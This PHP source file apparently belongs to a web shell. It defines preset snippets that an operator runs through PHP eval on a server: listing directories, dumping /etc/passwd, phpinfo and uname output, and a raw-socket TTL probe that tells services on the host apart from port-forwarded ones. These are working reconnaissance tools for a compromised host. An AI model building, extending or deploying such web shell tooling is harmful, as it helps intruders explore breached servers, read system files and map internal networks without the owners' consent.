<?php

// Inlined at build time — must assign, not return (top-level return would exit the shell).
// AJAX actions never render the HTML template, so the array would just be allocated
// and thrown away on every poll. Limit construction to the page-render path.
//
// Escape rule for snippet bodies:
//   Snippets travel nowdoc → json_encode → JS string → operator runs them in PHP eval.
//   Inside nowdoc (<<<'PHP') backslashes are literal. So:
//     `\\n` here  →  JSON `"\\\\n"`  →  JS `"\\n"`  →  PHP eval sees `\n`  →  newline at runtime.
//     `\n`  here  →  JSON `"\\n"`    →  JS real newline  →  PHP eval sees real newline char.
//   The first form is usually what you want (matches how you'd write a PHP string literal).
if (!isset($_POST['action'])) {
$TERMINAL_SNIPPETS = [
        'php' => [
                [
                        'scandir',
                        <<<'PHP'
print_r(scandir('.'));
PHP
                ],

                [
                        '/etc/passwd',
                        <<<'PHP'
echo file_get_contents('/etc/passwd');
PHP
                ],

                [
                        'phpinfo',
                        <<<'PHP'
phpinfo();
PHP
                ],

                [
                        'uname',
                        <<<'PHP'
echo php_uname();
PHP
                ],

                [
                        'traceroute',
                        <<<'PHP'
// Edit IP_HERE and the port, then run. Returns hop count to that service —
// compare two ports on the same IP: same TTL = service on host, higher TTL = DNAT/port-forward.
$ip='IP_HERE'; $port=80; $max=30; $timeout=2;
if (!extension_loaded('sockets')) { echo "needs PHP sockets extension\\n"; return; }
// Accept hostname or IP; bail clean on garbage so we don't misreport TTL=1.
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
  $r = gethostbyname($ip);
  if ($r === $ip || !filter_var($r, FILTER_VALIDATE_IP)) { echo "can't resolve '$ip'\\n"; return; }
  $ip = $r;
}
// PHP sockets ext doesn't expose IP_TTL as a named constant; 2 = Linux, 4 = BSD.
$IP_TTL = defined('IP_TTL') ? IP_TTL : (PHP_OS_FAMILY==='BSD'||PHP_OS_FAMILY==='Darwin' ? 4 : 2);
$socks=[];
for ($t=1; $t<=$max; $t++) {
  $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
  if ($s===false) continue;
  socket_set_option($s,IPPROTO_IP,$IP_TTL,$t);
  socket_set_nonblock($s);
  @socket_connect($s,$ip,$port);
  $socks[$t]=$s;
}
$w=$socks; $r=$e=null;
socket_select($r,$w,$e,$timeout);
// Only sockets in $w (writable after select) actually had a connect transition.
// SO_ERROR on sockets that never made it into $w is 0 by default — would falsely
// read as TTL=1 if iterated over $socks.
$hops=null;
foreach ($w as $ttl=>$s) {
  $err=socket_get_option($s,SOL_SOCKET,SO_ERROR);
  if (($err===0||$err===111) && ($hops===null||$ttl<$hops)) $hops=$ttl;
}
foreach ($socks as $s) socket_close($s);
echo $hops===null ? "no answer in $max hops\\n" : "TTL to $ip:$port = $hops\\n";
PHP
                ],
        ],
];
}
